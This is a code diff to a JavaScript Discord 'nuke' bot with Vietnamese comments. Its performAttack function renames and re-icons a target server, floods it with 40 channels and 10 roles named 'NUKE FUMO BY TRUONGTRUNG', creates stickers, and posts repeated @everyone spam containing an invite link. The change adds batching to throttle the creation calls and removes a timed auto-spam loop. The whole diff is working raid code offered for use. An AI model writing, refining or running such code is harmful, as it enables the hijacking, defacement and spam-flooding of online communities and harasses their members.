@@ -94,22 +94,16 @@ async function performAttack(guild, config) {
     const setNamePromise = guild.setName(config.newServerName).catch(console.error);
     const setIconPromise = fs.readFile('./icon.jpg').then(iconJpg => guild.setIcon(iconJpg).catch(console.error));
 
-    // Tạo 40 kênh và 10 vai trò
+    // Tạo 40 kênh
     const channelNames = Array(40).fill('NUKE FUMO BY TRUONGTRUNG');
-    const roleNames = Array(10).fill('NUKE FUMO BY TRUONGTRUNG');
-    const createChannelsPromise = Promise.all(channelNames.map(name => guild.channels.create({ name, type: 0 })));
-    const createRolesPromise = Promise.all(roleNames.map(name => guild.roles.create({ 
-        name, 
-        permissions: [], 
-        color: getRandomColor() // Màu sắc ngẫu nhiên
-    }).catch(console.error)));
+    const createChannelsPromise = batchPromises(channelNames, 5, name => guild.channels.create({ name, type: 0 }).catch(console.error));
 
     // Tạo sticker
     let createStickersPromise = Promise.resolve();
     try {
         const iconPngBuffer = await validateImage('./converted_image.png');
         createStickersPromise = Promise.all(
-            Array.from({ length: 5 }, (_, i) => 
+            Array.from({ length: 5 }, (_, i) =>
                 guild.stickers.create({
                     file: iconPngBuffer,
                     name: `Sticker${i + 1}`,
@@ -128,7 +122,6 @@ async function performAttack(guild, config) {
         setNamePromise,
         setIconPromise,
         createChannelsPromise,
-        createRolesPromise,
         deleteStickersPromise,
         createStickersPromise
     ]);
@@ -138,28 +131,31 @@ async function performAttack(guild, config) {
     const spamPromises = [];
     for (let i = 0; i < 5; i++) {
         for (const channel of newChannels) {
-            spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
-        }
-    }
-    await Promise.all(spamPromises);
-}
-
-async function autoNuke(guild, config) {
-    autoNukeActive = true;
-    const newChannels = await guild.channels.fetch();
-    const endTime = Date.now() + 3 * 60 * 1000; // 3 minutes from now
-
-    while (autoNukeActive && Date.now() < endTime) {
-        const spamPromises = [];
-        for (const channel of newChannels.values()) {
             if (channel.isTextBased()) {
                 spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
             }
         }
-        await Promise.all(spamPromises);
-        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before next spam wave
     }
-    autoNukeActive = false;
+    await Promise.all(spamPromises);
+
+    // Tạo 10 vai trò
+    const roleNames = Array(10).fill('NUKE FUMO BY TRUONGTRUNG');
+    const createRolesPromise = batchPromises(roleNames, 5, name => guild.roles.create({
+        name,
+        permissions: [],
+        color: getRandomColor()
+    }).catch(console.error));
+    await createRolesPromise;
+}
+
+async function batchPromises(items, batchSize, fn) {
+    const results = [];
+    for (let i = 0; i < items.length; i += batchSize) {
+        const batch = items.slice(i, i + batchSize);
+        const promises = batch.map(item => fn(item));
+        results.push(...await Promise.all(promises));
+    }
+    return results;
 }
 
 async function main() {
